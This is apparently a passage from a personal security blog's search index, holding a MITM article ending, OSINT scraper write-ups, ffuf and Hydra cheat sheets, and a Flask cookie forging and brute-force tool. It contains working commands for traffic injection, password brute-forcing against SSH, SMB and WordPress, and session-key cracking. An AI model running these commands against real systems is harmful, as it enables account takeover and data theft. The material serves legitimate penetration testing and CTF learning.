for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). ","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. \u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L 